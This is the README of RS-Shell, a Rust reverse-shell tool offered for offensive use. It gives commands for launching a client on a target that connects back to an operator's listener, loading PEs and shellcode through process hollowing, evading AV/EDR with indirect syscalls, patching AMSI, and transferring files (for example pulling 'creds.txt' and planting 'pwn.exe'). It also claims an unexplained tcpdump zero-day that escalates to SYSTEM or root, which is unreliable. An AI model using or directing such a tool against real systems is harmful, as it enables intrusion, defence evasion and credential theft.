<h1 align="center">
<br>
<img src=img/logo_craiyon.png height="400" border="2px solid #555">
<br>
<strong>RS-Shell</strong>
</h1>

*"The worst Rust programmer you have ever seen"* - my mom

*"But at least it works"* - still my mom, but not about me

## Description

RS-Shell is a TLS over TCP reverse shell developped in Rust with client and server embedded in the same binary. This project has been mainly started to learn Rust with a tool that could help me in my work, and the code quality could be greatly improved. This project is like my Rust sandbox where I can test new things.

Client and server are both cross-platform and work on Windows and Linux systems.

For Windows client, additonal features have been integrated for offensive purpose, and they will be improved in futur commits.

For this purpose, I have chosen to mainly use the official [windows_sys](https://docs.rs/windows-sys/latest/windows_sys/) crate to interact with the Win32API and the [ntapi](https://docs.rs/ntapi/latest/ntapi/) crate for the NTAPI.

The project is thought in module. This means that you can easily add or remove features to and from it, and you can also easily take parts from it to put them in your own project.

## Features

For the moment, the following features are present:

* Semi-interactive reverse shell via TLS over TCP
* File upload and download between server and client
* Start a PowerShell interactive session with the ability to patch the AMSI in memory with or without indirect syscalls
* Loading features :
  * Load and execute a PE in the client memory, **with or without indirect syscalls**
  * Load and execute a PE in a remote process memory, **with or without indirect syscalls**
  * Load and execute a shellcode in a remote process memory, **with or without indirect syscalls**
* Autopwn the client machine and elevate the privileges to SYSTEM or root by exploiting a 0day in `tcpdump`

To perform the indirect syscalls, I use the incredible [rust-mordor-rs](https://github.com/gmh5225/rust-mordor-rs) project initiate by [memN0ps](https://twitter.com/memN0ps). However, I use the version from my repository, which just patches little errors I have found regarding libraries versions and crate imports.

## How to

### Setup

I have set a `dummy` domain for hostname validation in the `connect()` function for both clients. If you use a signed certificate for a real server, you can change it and remove the unsecure functions that remove hostname and certs validations.

By default, only the `error`, `warn` and `info` logs are displayed. If you also need the `debug` ones (can be usefull for the loading features), you can change this in `main.rs` by modifying `::log::set_max_level(LevelFilter::Info);` to `::log::set_max_level(LevelFilter::Debug);`.

A new self-signed TLS certificate can be obtained like this :

```bash
openssl req -newkey rsa:2048 -nodes -keyout private.key -x509 -days 365 -out certificate.cer
openssl pkcs12 -export -out certificate.pfx -inkey private.key -in certificate.cer
```

### Compilation

The project can be compiled with `cargo build --release` on Windows or Linux and the binary will be present in `target/release/`, or the target name if a target is specified.

To cross-compile for a different target than your current OS you can use, for example, `cargo build --release --target x86_64-pc-windows-gnu`. In order to work, this requires the appropriate target toolchain to be installed. As an example, to generate Windows binaries from an Ubuntu machine:
* `sudo apt install mingw-w64`
* `rustup target add x86_64-pc-windows-gnu`
* `cargo build --release --target x86_64-pc-windows-gnu`

The project compilation has been tested with the following Rust toolchains :

* `stable-x86_64-pc-windows-gnu`
* `stable-x86_64-pc-windows-msvc`
* `stable-x86_64-unknown-linux-gnu`

If you compile the project for a Linux target, the "Windows features" will be removed at compilation.
Should run on all Windows and Linux versions (I have hope).

### Usage

```plain
Usage: rs-shell.exe [OPTIONS] --side <side> --ip <ip> --port <port>

Options:
  -s, --side <side>            launch the client or the listener [possible values: c, l]
  -i, --ip <ip>                IP address to bind to for the listener, or to connect to for the clien
  -p, --port <port>            port address to bind to for the listener, or to connect to for the client
      --cert-path <cert_path>  path of the TLS certificate (in PFX or PKCS12 format) for the server
      --cert-pass <cert_pass>  password of the TLS certificate for the server
  -h, --help                   Print help
  -V, --version                Print version

In a session, type 'help' for advanced integrated commands
```

To obtain a session, just launch the binary in listener mode on your machine with `rs-shell.exe -s l -i IP_to_bind_to -p port_to_bind_to --cert-path certificate_path --cert-pass certificate_password`. For example `rs-shell.exe -s l -i 0.0.0.0 -p 4545 --cert-path certificate.pfx --cert-pass "Password"`.

Then, on the target machine launch the client to connect back to your server with `rs-shell.exe -s c -i IP_to_connect_to -p port_to_connect_to`. For example `rs-shell.exe -s c --ip 192.168.1.10 --port 4545`.

### Advanced commands

```plain
> help
[+] Custom integrated commands :

    [+] Loading commands
    > load C:\\path\\to\\PE_to_load
        load a PE file in the client process memory and executes it. This will kill the reverse shell !
    > load -h C:\\path\\to\\PE_to_load C:\\path\\to\\PE_to_hollow
        load a PE file in a remote process memory with process hollowing and executes it
    > load -s C:\\path\\to\\shellcode.bin C:\\path\\to\\PE_to_execute
        load a shellcode in a remote process memory and start a new thread with it

    [+] Loading commands with indirect syscalls
    > syscalls C:\\path\\to\\PE_to_load
        load a PE file in the client process memory and executes it, with indirect syscalls. This will kill the reverse shell !
    > syscalls -h C:\\path\\to\\PE_to_load C:\\path\\to\\PE_to_hollow
        load a PE file in a remote process memory with process hollowing and executes it, with indirect syscalls
    > syscalls -s C:\\path\\to\\shellcode.bin C:\\path\\to\\PE_to_execute
        load a shellcode in a remote process memory and start a new thread with it, with indirect syscalls

    [+] Bypass commands
    > powpow
        start a new interactive PowerShell session with the AMSI patched in memory, with or without indirect syscalls

    [+] Network commands
    > download C:\\file\\to\\download C:\\local\\path
        download a file from the remote system
    > upload C:\\local\\file\\to\\upload C:\\remote\\path\\to\\write
        upload a file to the remote system

    [+] Special commands
    > autopwn
        escalate to the SYSTEM or root account from any local account by exploiting a zero day
```

The `load` commands permit to load and execute directly in memory:

* `load` loads and execute a PE in the client memory. This will kill the reverse shell, but that could be usefull to launch a C2 implant in the current process for example
* `load -h` loads and execute a PE in a created remote process memory with process hollowing. You don't lose your reverse shell session, but the process hollowing will be potentially flag by the AV or the EDR
* `load -s` loads and execute a shellcode from a `.bin` file in a created remote process memory. You don't lose your reverse shell session, and you don't have to drop the bin file on the target, since the shellcode will be transfered to the target via the TCP tunnel

For example : `> load -h C:\Windows\System32\calc.exe C:\Windows\System32\cmd.exe`. This will start a `cmd.exe` process with hollowing, load a `calc.exe` image in the process memory, and then resume the thread to execute the calc.

On the other hand, the `syscalls` commands permit the same things, but everything is performed with indirect syscalls.

`powpow` starts an interactive PowerShell session with a PowerShell process where the AMSI `ScanBuffer` function has been patched in memory. This feature is not particularly opsec. The patching operation can be performed with or without indirect syscalls.

`download` permits to download a file from the client to the machine where the listener is running. For example `download C:\Users\Administrator\Desktop\creds.txt ./creds.txt`.

`upload` permits to upload a file on the client machine. For example `upload ./pwn.exe C:\Temp\pwn.exe`.

`autopwn` permits to escalate to the **SYSTEM or root account** with a 0day exploitation. Just type `autopwn` and answer the question.

## Todo

- [x] Move all the Win32API related commands to the NTAPI with indirect syscalls
- [ ] Implement other injection techniques
- [ ] Implement a port forwarding solution
- [ ] Find a way to create a fully proxy aware client
- [ ] Implement a reverse socks proxy feature

## Disclaimers

This is an obvious disclaimer because I don't want to be held responsible if someone uses this tool against anyone who hasn't asked for anything.

Usage of anything presented in this repo to attack targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.

## Acknowledgements

* [OffensiveRust](https://github.com/winsecurity/Offensive-Rust) by [winsecurity](https://github.com/winsecurity). This project would never have existed without him. Many of functions, structures, and tricks present in `rs-shell` come from this project
* [OffensiveRust](https://github.com/trickster0/OffensiveRust) by [trickster0](https://github.com/trickster0)
* Multiple projects by [memN0ps](https://github.com/memN0ps)
* [RustPacker](https://github.com/Nariod/RustPacker) by [Nariod](https://github.com/Nariod)
* Nik Brendler's blog posts about pipe communication between process in Rust. [Part 1](https://www.nikbrendler.com/rust-process-communication/) and [Part 2](https://www.nikbrendler.com/rust-process-communication-part-2/)
* [rust-mordor-rs](https://github.com/gmh5225/rust-mordor-rs) by [memN0ps](https://twitter.com/memN0ps), an incredible library for indirect syscalls in Rust